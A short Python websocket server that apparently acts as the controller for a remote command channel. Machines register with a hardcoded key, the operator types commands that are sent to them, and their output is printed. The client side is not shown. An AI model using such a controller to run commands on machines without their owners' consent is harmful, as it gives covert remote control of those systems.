from websockets import serve
from asyncio import get_event_loop
# THIS IS THE SERVER
# I SHOULD CONVERT TO BINARY SOB
connectedMachines = []
async def main(websocket, path):
    while True:
        res = await websocket.recv()
        if "KEY: OmG" in res:
            try:
                machineName = res.split("CONNECT: ")[1].split(" KEY:")[0]
                if machineName in connectedMachines:
                    continue

                await websocket.send("SUCCESS")
                connectedMachines.append(machineName)
            except:
                pass
        elif "<MCHNNAME: " in res:
            cmd = input(f"{res.split('<MCHNNAME: ')[1].split('>')[0]}: ")
            await websocket.send(f">{cmd}")
        else:
            if res == "\n\n\n\n\nEND":
                continue
            print(res)

asyncEventLoop = get_event_loop()
startWebSockets = serve(main, "localhost", 8765)
asyncEventLoop.run_until_complete(startWebSockets)
asyncEventLoop.run_forever()







# connect to 

